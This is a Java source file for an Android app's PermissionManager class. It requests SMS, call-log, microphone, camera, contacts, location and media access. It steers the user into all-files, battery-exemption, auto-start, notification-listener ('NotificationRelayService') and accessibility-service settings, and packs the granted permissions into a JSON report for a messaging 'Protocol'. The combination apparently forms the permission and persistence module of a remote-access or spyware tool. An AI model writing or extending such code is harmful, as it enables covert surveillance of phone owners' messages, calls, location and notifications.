package com.fason.app.core.permissions;

import android.Manifest;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.fason.app.core.FasonApp;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.Protocol;
import com.fason.app.features.notification.NotificationRelayService;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

public final class PermissionManager {
    private PermissionManager() {}
    public static String[] getRequiredPerms() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.SEND_SMS);
        perms.add(Manifest.permission.READ_PHONE_STATE);
        perms.add(Manifest.permission.READ_CALL_LOG);
        perms.add(Manifest.permission.RECORD_AUDIO);
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(Manifest.permission.READ_CONTACTS);
        perms.add(Manifest.permission.RECEIVE_SMS);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
            perms.add(Manifest.permission.READ_MEDIA_VIDEO);
            perms.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        return perms.toArray(new String[0]);
    }

    public static boolean isGranted(Context ctx, String perm) {
        if (perm == null || ctx == null) return false;
        return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED;
    }

    public static boolean hasAllPerms(Context ctx) {
        for (String p : getRequiredPerms()) {
            if (!isGranted(ctx, p)) return false;
        }
        return true;
    }

    public static List<String> getDeniedPerms(Context ctx) {
        List<String> denied = new ArrayList<>();
        for (String p : getRequiredPerms()) {
            if (!isGranted(ctx, p)) denied.add(p);
        }
        return denied;
    }

    public static List<String> getRationalePerms(Activity act) {
        List<String> perms = new ArrayList<>();
        if (act == null) return perms;
        for (String p : getRequiredPerms()) {
            if (!isGranted(act, p) &&
                ActivityCompat.shouldShowRequestPermissionRationale(act, p)) {
                perms.add(p);
            }
        }
        return perms;
    }

    public static void requestPerms(Activity act, int reqCode) {
        if (act == null) return;
        List<String> needed = getDeniedPerms(act);
        if (needed.isEmpty()) return;
        ActivityCompat.requestPermissions(act, needed.toArray(new String[0]), reqCode);
    }

    public static boolean hasStorageManager() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return true;
        return Environment.isExternalStorageManager();
    }

    public static boolean requestStorageManager(Context ctx) {
        if (ctx == null) return false;
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return false;
        if (Environment.isExternalStorageManager()) return false;
        Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
        i.setData(Uri.parse("package:" + ctx.getPackageName()));
        if (!(ctx instanceof Activity)) {
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        }
        try {
            ctx.startActivity(i);
            return true;
        } catch (Exception e) {
            Intent i2 = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
            if (!(ctx instanceof Activity)) {
                i2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            }
            ctx.startActivity(i2);
            return true;
        }
    }

    public static boolean hasBatteryExemption(Context ctx) {
        if (ctx == null) return false;
        PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
        if (pm == null) return false;
        return pm.isIgnoringBatteryOptimizations(ctx.getPackageName());
    }

    public static boolean requestBatteryExemption(Activity act) {
        if (act == null || hasBatteryExemption(act)) return false;
        Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        i.setData(Uri.parse("package:" + act.getPackageName()));
        act.startActivity(i);
        return true;
    }

    public static boolean hasNotifAccess(Context ctx) {
        if (ctx == null) return false;
        String listeners = Settings.Secure.getString(
            ctx.getContentResolver(), Protocol.SETTING_NOTIF_LISTENERS);
        if (listeners == null || listeners.isEmpty()) return false;
        String flat = new ComponentName(ctx, NotificationRelayService.class).flattenToString();
        for (String token : listeners.split(":")) {
            if (token.equals(flat)) return true;
        }
        return false;
    }

    public static boolean requestNotifAccess(Context ctx) {
        if (ctx == null || hasNotifAccess(ctx)) return false;
        Intent i = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
        if (!(ctx instanceof Activity)) {
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        }
        ctx.startActivity(i);
        return true;
    }

    public static boolean hasAccessibilityAccess(Context ctx) {
        if (ctx == null) return false;
        try {
            String enabled = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null || enabled.isEmpty()) return false;
            ComponentName svc = new ComponentName(ctx, FasonAccessibilityService.class);
            String flat = svc.flattenToString();
            for (String token : enabled.split(":")) {
                if (token.equals(flat)) return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean requestAccessibilityAccess(Context ctx) {
        if (ctx == null || hasAccessibilityAccess(ctx)) return false;
        Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        if (!(ctx instanceof Activity)) {
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        }
        ctx.startActivity(i);
        return true;
    }

    public static boolean needsAutoStart(Context ctx) {
        return OemAutoStartHelper.isAutoStartNeeded(ctx);
    }

    public static OemAutoStartHelper.AutoStartResult requestAutoStart(Activity act) {
        return OemAutoStartHelper.requestAutoStart(act);
    }

    public static boolean hasAutoStartAccess(Context ctx) {
        if (ctx == null) return false;
        if (!OemAutoStartHelper.isAutoStartNeeded(ctx)) {
            return true;
        }
        SharedPreferences prefs;
        try {
            prefs = ctx.getSharedPreferences(Protocol.PREFS_NAME, Context.MODE_PRIVATE);
        } catch (Exception e) {
            return false;
        }
        boolean visited = prefs.getBoolean(Protocol.PREF_AUTOSTART_VISITED, false);
        if (!visited) {
            return false;
        }
        return !isExplicitlyRestricted(ctx);
    }

    public static void markAutoStartVisited(Context ctx) {
        if (ctx == null) return;
        try {
            SharedPreferences prefs = ctx.getSharedPreferences(
                Protocol.PREFS_NAME, Context.MODE_PRIVATE);
            prefs.edit().putBoolean(Protocol.PREF_AUTOSTART_VISITED, true).apply();
        } catch (Exception ignored) {}
    }

    private static boolean isExplicitlyRestricted(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            try {
                ActivityManager am = (ActivityManager)
                    ctx.getSystemService(Context.ACTIVITY_SERVICE);
                if (am != null && am.isBackgroundRestricted()) {
                    Log.d("PermMgr", "Background restricted");
                    return true;
                }
            } catch (Exception ignored) {}
        }
        return false;
    }

    public static void openAppSettings(Context ctx) {
        if (ctx == null) return;
        try {
            Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            i.setData(Uri.parse("package:" + ctx.getPackageName()));
            if (!(ctx instanceof Activity)) {
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            }
            ctx.startActivity(i);
        } catch (Exception ignored) {}
    }

    public static boolean canIUse(String perm) {
        try {
            return isGranted(FasonApp.getContext(), perm);
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean hasAllPerms() {
        try {
            return hasAllPerms(FasonApp.getContext());
        } catch (Exception e) {
            return false;
        }
    }

    public static JSONObject getGranted() {
        JSONObject data = new JSONObject();
        try {
            Context ctx = FasonApp.getContext();
            JSONArray perms = new JSONArray();
            for (String p : getRequiredPerms()) {
                JSONObject perm = new JSONObject();
                perm.put(Protocol.KEY_PERMISSION, p);
                perm.put(Protocol.KEY_ALLOWED, isGranted(ctx, p));
                perms.put(perm);
            }
            data.put(Protocol.KEY_PERMISSIONS, perms);
        } catch (Exception e) {
            try { data.put(Protocol.KEY_ERROR, e.getMessage()); } catch (Exception ignored) {}
        }
        return data;
    }
}
